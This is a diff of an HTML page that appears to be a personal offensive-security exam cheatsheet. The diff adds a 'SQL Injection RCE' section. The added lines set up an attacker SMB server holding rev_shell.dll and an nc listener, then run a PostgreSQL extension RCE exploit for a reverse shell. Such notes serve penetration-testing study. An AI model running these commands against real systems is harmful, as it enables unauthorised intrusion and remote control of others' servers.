@@ -83,7 +83,7 @@
     <p><a href="#remote-debugging">Remote Debugging</a></p>
   </li>
   <li>
-    <p><a href="#review-source-code">Review Source Code</a></p>
+    <p><a href="#SQL-injection-RCE">SQL Injection RCE</a></p>
   </li>
   
 <!-- sidebar.html end -->
@@ -130,7 +130,7 @@
 </code></pre></div></div>
 <hr>
 
-<h2 id="remote-debugging">Review Source Code</h2>
+<h2 id="SQL-injection-RCE">SQL Injection RCE</h2>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Detect SQL Injection
 #Regex to search for query: (use with notepad++ to find in files) - many results
@@ -167,12 +167,20 @@
         ### Note: replace '+'' in 'base64-encoded-one-liner-payload' by '%2b' | or just url-encode the whole payload
 
 </code></pre></div></div>
-<hr>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Enum vulnerable script (which will be loaded in vulnerable app)
 <img src="./OSCP%20personal%20cheatsheet_files/procmon.png">
 </code></pre></div></div>
 <hr>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>### Attack vector: PostgreSQL Extensions
+# Attacker: host smbserver contains rev_shell.dll file
+    sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali ~/Desktop/OffSec/OSWE/Weapons/
+    nc -lnvp 4444
+    python2 postgresql_extension_rce.py 192.168.192.113:8443 192.168.45.181 4444
+    (may need to change the IP of remote smb server in postgresql_extension_rce.py)
 
+</code></pre></div></div>
+<!-- END -->
+<hr>
 </div>
 		<div>
       <section class="share col-sm-6">
